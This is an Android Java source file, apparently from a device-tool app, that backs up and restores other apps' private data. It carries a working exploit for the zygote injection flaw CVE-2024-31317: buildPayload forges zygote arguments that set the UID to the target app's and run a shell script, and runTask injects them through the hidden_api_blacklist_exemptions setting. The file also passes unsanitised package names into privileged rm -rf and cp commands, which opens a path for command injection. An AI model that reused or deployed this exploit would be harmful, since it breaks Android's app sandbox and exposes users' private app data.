package com.wqry085.deployesystem;

import android.content.ContentValues;
import android.content.pm.ApplicationInfo;
import android.content.pm.PackageManager;
import android.graphics.drawable.Drawable;
import android.net.Uri;
import android.os.Bundle;
import android.os.Handler;
import android.os.Looper;
import android.provider.Settings;
import android.view.LayoutInflater;
import android.view.View;
import android.view.ViewGroup;
import android.widget.EditText;
import android.widget.ImageButton;
import android.widget.ImageView;
import android.widget.LinearLayout;
import android.widget.TextView;
import android.widget.Toast;

import androidx.annotation.NonNull;
import androidx.annotation.Nullable;
import androidx.fragment.app.Fragment;
import androidx.recyclerview.widget.LinearLayoutManager;
import androidx.recyclerview.widget.RecyclerView;

import com.google.android.material.dialog.MaterialAlertDialogBuilder;

import java.io.BufferedReader;
import java.io.File;
import java.io.InputStreamReader;
import java.io.OutputStream;
import java.nio.charset.StandardCharsets;
import java.text.SimpleDateFormat;
import java.util.ArrayList;
import java.util.Collections;
import java.util.Date;
import java.util.List;
import java.util.Locale;

import rikka.shizuku.Shizuku;

/**
 * 进阶功能页：基于 CVE-2024-31317 的 App 数据备份/恢复（cppkg/repkg 逻辑）
 * - 备份/恢复应用数据
 * - 备份管理：扫描 /sdcard/backup/ 列出已备份应用，显示大小/时间，支持删除
 */
public class AdvancedFragment extends Fragment {

    private static final String TAG = "AdvancedFragment";
    private static final String BACKUP_ROOT = "/sdcard/backup";

    private EditText pkgInput;
    private TextView toolLog;
    private TextView backupSummary;
    private RecyclerView backupList;
    private LinearLayout backupEmptyLayout;
    private final Handler handler = new Handler(Looper.getMainLooper());
    private boolean running = false;

    private BackupAdapter backupAdapter;
    private final List<BackupEntry> backupEntries = new ArrayList<>();

    @Nullable
    @Override
    public View onCreateView(@NonNull LayoutInflater inflater, @Nullable ViewGroup container,
                             @Nullable Bundle savedInstanceState) {
        return inflater.inflate(R.layout.fragment_advanced, container, false);
    }

    @Override
    public void onViewCreated(@NonNull View view, @Nullable Bundle savedInstanceState) {
        super.onViewCreated(view, savedInstanceState);

        pkgInput = view.findViewById(R.id.pkg_input);
        toolLog = view.findViewById(R.id.tool_log);
        backupSummary = view.findViewById(R.id.backup_summary);
        backupList = view.findViewById(R.id.backup_list);
        backupEmptyLayout = view.findViewById(R.id.backup_empty_layout);

        view.findViewById(R.id.row_backup).setOnClickListener(v -> startBackup());
        view.findViewById(R.id.row_restore).setOnClickListener(v -> startRestore());
        view.findViewById(R.id.btn_refresh_backups).setOnClickListener(v -> scanBackups());

        backupList.setLayoutManager(new LinearLayoutManager(getContext()));
        backupAdapter = new BackupAdapter();
        backupList.setAdapter(backupAdapter);

        scanBackups();
    }

    @Override
    public void onResume() {
        super.onResume();
        scanBackups();
    }

    // ==================== 备份管理 ====================

    static class BackupEntry {
        String packageName;
        File dir;
        long totalSize;
        long lastModified;
        boolean hasDataData;
        boolean hasAndroidData;

        String sizeText() {
            return formatSize(totalSize);
        }

        String timeText() {
            SimpleDateFormat sdf = new SimpleDateFormat("yyyy-MM-dd HH:mm", Locale.getDefault());
            return sdf.format(new Date(lastModified));
        }
    }

    private static String formatSize(long bytes) {
        if (bytes <= 0) return "0 B";
        String[] units = {"B", "KB", "MB", "GB"};
        int idx = (int) (Math.log10(bytes) / Math.log10(1024));
        if (idx >= units.length) idx = units.length - 1;
        double v = bytes / Math.pow(1024, idx);
        return String.format(Locale.getDefault(), "%.1f %s", v, units[idx]);
    }

    /** 扫描 /sdcard/backup/ 下的备份目录（后台线程执行） */
    private void scanBackups() {
        new Thread(() -> {
            List<BackupEntry> found = new ArrayList<>();
            File root = new File(BACKUP_ROOT);
            File[] dirs = root.exists() ? root.listFiles(File::isDirectory) : null;
            if (dirs != null) {
                for (File d : dirs) {
                    if (d.getName().startsWith(".")) continue;
                    BackupEntry e = new BackupEntry();
                    e.packageName = d.getName();
                    e.dir = d;
                    e.totalSize = computeDirSize(d);
                    e.lastModified = d.lastModified();
                    e.hasDataData = new File(d, "data_data").isDirectory();
                    e.hasAndroidData = new File(d, "Android_data").isDirectory();
                    found.add(e);
                }
            }
            // 按最后修改时间倒序
            Collections.sort(found, (a, b) -> Long.compare(b.lastModified, a.lastModified));

            handler.post(() -> {
                backupEntries.clear();
                backupEntries.addAll(found);
                backupAdapter.notifyDataSetChanged();

                long total = 0;
                for (BackupEntry e : backupEntries) total += e.totalSize;
                backupSummary.setText(backupEntries.isEmpty()
                        ? "未发现备份数据"
                        : "共 " + backupEntries.size() + " 个备份 · 总计 " + formatSize(total));

                backupList.setVisibility(backupEntries.isEmpty() ? View.GONE : View.VISIBLE);
                backupEmptyLayout.setVisibility(backupEntries.isEmpty() ? View.VISIBLE : View.GONE);
            });
        }).start();
    }

    /** 递归计算目录大小 */
    private long computeDirSize(File dir) {
        long size = 0;
        File[] files = dir.listFiles();
        if (files == null) return 0;
        for (File f : files) {
            if (f.isDirectory()) {
                size += computeDirSize(f);
            } else {
                size += f.length();
            }
        }
        return size;
    }

    /** 删除备份（带确认） */
    private void deleteBackup(BackupEntry entry) {
        new MaterialAlertDialogBuilder(requireContext())
                .setTitle("删除备份")
                .setMessage("确定删除应用 " + entry.packageName + " 的备份数据？\n（" + entry.sizeText() + "）\n此操作不可恢复。")
                .setPositiveButton("删除", (dialog, which) -> doDelete(entry))
                .setNegativeButton("取消", (dialog, which) -> dialog.dismiss())
                .show();
    }

    private void doDelete(BackupEntry entry) {
        appendLog(">>> 删除备份: " + entry.packageName);
        new Thread(() -> {
            boolean ok;
            try {
                // 优先本地递归删除（/sdcard 可写）；失败则用 Shizuku 强删
                ok = deleteRecursive(entry.dir);
                if (!ok) {
                    String r = shizukuExec("rm -rf " + BACKUP_ROOT + "/" + entry.packageName);
                    ok = !new File(entry.dir.getAbsolutePath()).exists();
                }
            } catch (Exception e) {
                ok = false;
                appendLog("错误: " + e.getMessage());
            }
            final boolean success = ok;
            handler.post(() -> {
                if (success) {
                    appendLog("✅ 已删除备份: " + entry.packageName);
                    scanBackups();
                } else {
                    appendLog("❌ 删除失败，请检查存储权限");
                    Toast.makeText(requireContext(), "删除失败", Toast.LENGTH_SHORT).show();
                }
            });
        }).start();
    }

    private boolean deleteRecursive(File f) {
        if (f == null) return true;
        if (f.isDirectory()) {
            File[] children = f.listFiles();
            if (children != null) {
                for (File c : children) {
                    if (!deleteRecursive(c)) return false;
                }
            }
        }
        return f.delete();
    }

    // ==================== 备份 / 恢复 ====================

    private void startBackup() {
        String pkg = getPackage();
        if (pkg == null) return;
        appendLog(">>> 开始备份: " + pkg);
        runTask(pkg, false);
    }

    private void startRestore() {
        String pkg = getPackage();
        if (pkg == null) return;
        appendLog(">>> 开始恢复: " + pkg);
        runTask(pkg, true);
    }

    private String getPackage() {
        String pkg = pkgInput.getText().toString().trim();
        if (pkg.isEmpty()) {
            Toast.makeText(requireContext(), "请输入应用包名", Toast.LENGTH_SHORT).show();
            return null;
        }
        return pkg;
    }

    private void runTask(String pkg, boolean restore) {
        if (running) {
            Toast.makeText(requireContext(), "任务执行中，请等待", Toast.LENGTH_SHORT).show();
            return;
        }
        running = true;

        new Thread(() -> {
            try {
                // 1. 获取应用 UID
                appendLog("[+] 获取应用 UID ...");
                String uidResult = shizukuExec("ls -lnd /data/data/" + pkg + " 2>/dev/null | awk '{print $3}'");
                String appUid = uidResult.trim().split("\n")[0].trim();
                if (appUid.isEmpty() || !appUid.matches("\\d+")) {
                    appendLog("错误: 无法获取应用 UID，请确认应用已安装");
                    running = false;
                    return;
                }
                appendLog("[+] 包名: " + pkg + ", UID: " + appUid);

                String backupBase = BACKUP_ROOT + "/" + pkg;

                // 2. 写入执行脚本到 /data/local/tmp
                String scriptPath = "/data/local/tmp/" + (restore ? "restore" : "backup") + "_$$.sh";
                String script;
                if (restore) {
                    script = "#!/system/bin/sh\n"
                            + "rm -rf /data/data/" + pkg + "/*\n"
                            + "cp -r " + backupBase + "/data_data/. /data/data/" + pkg + "/\n"
                            + "rm -rf /sdcard/Android/data/" + pkg + "/*\n"
                            + "cp -r " + backupBase + "/Android_data/. /sdcard/Android/data/" + pkg + "/\n"
                            + "echo RESTORE_DONE > " + backupBase + "/restore_status.txt\n";
                } else {
                    script = "#!/system/bin/sh\n"
                            + "mkdir -p " + backupBase + "/data_data\n"
                            + "mkdir -p " + backupBase + "/Android_data\n"
                            + "rm -rf " + backupBase + "/data_data/*\n"
                            + "rm -rf " + backupBase + "/Android_data/*\n"
                            + "cp -r /data/data/" + pkg + "/. " + backupBase + "/data_data/\n"
                            + "cp -r /sdcard/Android/data/" + pkg + "/. " + backupBase + "/Android_data/\n"
                            + "echo BACKUP_DONE > " + backupBase + "/status.txt\n";
                }

                shizukuExec("mkdir -p /data/local/tmp");
                // 通过 base64 写脚本避免转义
                String b64 = android.util.Base64.encodeToString(script.getBytes(StandardCharsets.UTF_8), android.util.Base64.NO_WRAP);
                shizukuExec("echo '" + b64 + "' | base64 -d > " + scriptPath);
                shizukuExec("chmod 755 " + scriptPath);
                appendLog("[+] 已写入执行脚本");

                // 3. 构建 payload（参考 cppkg/repkg）
                String payload = buildPayload(appUid, scriptPath);

                // 🔒 纵深防御：备份/恢复注入链路同样拦截重启类命令
                String rebootReason = PayloadGuard.findRebootReason(payload);
                if (rebootReason != null) {
                    appendLog("🚫 已拦截: " + rebootReason + "（重启类命令 100% 卡开机）");
                    running = false;
                    return;
                }

                // 4. 执行注入
                appendLog("[+] 触发漏洞执行" + (restore ? "恢复" : "备份") + " ...");
                shizukuExec("am force-stop com.android.settings");
                shizukuExec("am force-stop " + pkg);

                ContentValues values = new ContentValues();
                values.put(Settings.Global.NAME, "hidden_api_blacklist_exemptions");
                values.put(Settings.Global.VALUE, payload);
                requireContext().getContentResolver().insert(
                        Uri.parse("content://settings/global"), values);

                shizukuExec("am start -n com.android.settings/.Settings");

                // 5. 等待执行
                Thread.sleep(5000);

                // 6. 重置设置
                ContentValues reset = new ContentValues();
                reset.put(Settings.Global.NAME, "hidden_api_blacklist_exemptions");
                reset.put(Settings.Global.VALUE, "null");
                requireContext().getContentResolver().insert(
                        Uri.parse("content://settings/global"), reset);
                shizukuExec("am force-stop com.android.settings");
                shizukuExec("rm -f " + scriptPath);

                // 7. 验证
                String statusFile = restore ? backupBase + "/restore_status.txt" : backupBase + "/status.txt";
                String check = shizukuExec("[ -f " + statusFile + " ] && echo OK || echo NO");
                if (check.contains("OK")) {
                    appendLog("✅ " + (restore ? "恢复" : "备份") + "成功！");
                } else {
                    appendLog("❌ " + (restore ? "恢复" : "备份") + "失败，可能漏洞未触发");
                }

                // 8. 刷新备份列表
                handler.post(this::scanBackups);
            } catch (Exception e) {
                appendLog("错误: " + e.getMessage());
            } finally {
                running = false;
            }
        }).start();
    }

    private String buildPayload(String uid, String scriptPath) {
        return "\n\n\n\n\n10\n"
                + "--setuid=" + uid + "\n"
                + "--setgid=" + uid + "\n"
                + "--setgroups=9997\n"
                + "--mount-external-full\n"
                + "--runtime-args\n"
                + "--seinfo=platform:privapp:targetSdkVersion=30:complete\n"
                + "--runtime-flags=1\n"
                + "--nice-name=zYg0te\n"
                + "--invoke-with\n"
                + "sh " + scriptPath + "\n"
                + ",,,,X";
    }

    // ==================== 适配器 ====================

    private class BackupAdapter extends RecyclerView.Adapter<BackupAdapter.VH> {

        @NonNull
        @Override
        public VH onCreateViewHolder(@NonNull ViewGroup parent, int viewType) {
            View v = LayoutInflater.from(parent.getContext())
                    .inflate(R.layout.item_backup_entry, parent, false);
            return new VH(v);
        }

        @Override
        public void onBindViewHolder(@NonNull VH holder, int position) {
            BackupEntry e = backupEntries.get(position);
            holder.name.setText(e.packageName);

            StringBuilder info = new StringBuilder();
            info.append(e.sizeText()).append(" · ").append(e.timeText());
            if (e.hasDataData) info.append("\ndata_data ✓");
            if (e.hasAndroidData) info.append("  Android_data ✓");
            if (!e.hasDataData && !e.hasAndroidData) info.append("\n(备份目录为空)");
            holder.info.setText(info.toString());

            // 应用图标（包名对应的已安装应用）
            Drawable icon = null;
            String appLabel = e.packageName;
            try {
                PackageManager pm = requireContext().getPackageManager();
                ApplicationInfo ai = pm.getApplicationInfo(e.packageName, 0);
                icon = pm.getApplicationIcon(ai);
                appLabel = pm.getApplicationLabel(ai).toString();
                holder.name.setText(appLabel);
                holder.info.setText(e.packageName + "\n" + e.sizeText() + " · " + e.timeText()
                        + (e.hasDataData ? " · data_data ✓" : "") + (e.hasAndroidData ? " · Android_data ✓" : ""));
            } catch (PackageManager.NameNotFoundException ignored) {
                // 应用已卸载，保留包名
            }
            holder.icon.setImageDrawable(icon != null ? icon : requireContext().getDrawable(R.drawable.ic_apps));

            // 点击填充包名
            holder.itemView.setOnClickListener(v -> {
                pkgInput.setText(e.packageName);
                pkgInput.setSelection(e.packageName.length());
                Toast.makeText(requireContext(), "已填入包名: " + e.packageName, Toast.LENGTH_SHORT).show();
            });

            // 删除
            holder.deleteBtn.setOnClickListener(v -> deleteBackup(e));
        }

        @Override
        public int getItemCount() {
            return backupEntries.size();
        }

        class VH extends RecyclerView.ViewHolder {
            ImageView icon;
            TextView name;
            TextView info;
            ImageButton deleteBtn;

            VH(@NonNull View itemView) {
                super(itemView);
                icon = itemView.findViewById(R.id.backup_icon);
                name = itemView.findViewById(R.id.backup_name);
                info = itemView.findViewById(R.id.backup_info);
                deleteBtn = itemView.findViewById(R.id.btn_delete_backup);
            }
        }
    }

    // ==================== 日志 ====================

    private void appendLog(String line) {
        handler.post(() -> {
            String cur = toolLog.getText().toString();
            if (cur.equals("等待操作...")) cur = "";
            toolLog.setText(cur + "\n" + line);
        });
    }

    private String shizukuExec(String cmd) {
        StringBuilder output = new StringBuilder();
        try {
            Process p = Shizuku.newProcess(new String[]{"sh"}, null, null);
            try (OutputStream os = p.getOutputStream()) {
                os.write((cmd + "\nexit\n").getBytes(StandardCharsets.UTF_8));
                os.flush();
            }
            try (BufferedReader r = new BufferedReader(
                    new InputStreamReader(p.getInputStream(), StandardCharsets.UTF_8))) {
                String line;
                while ((line = r.readLine()) != null) {
                    output.append(line).append("\n");
                }
            }
            try (BufferedReader r = new BufferedReader(
                    new InputStreamReader(p.getErrorStream(), StandardCharsets.UTF_8))) {
                String line;
                while ((line = r.readLine()) != null) {
                    output.append(line).append("\n");
                }
            }
            p.waitFor();
        } catch (Exception e) {
            output.append(e.getMessage());
        }
        return output.toString().trim();
    }
}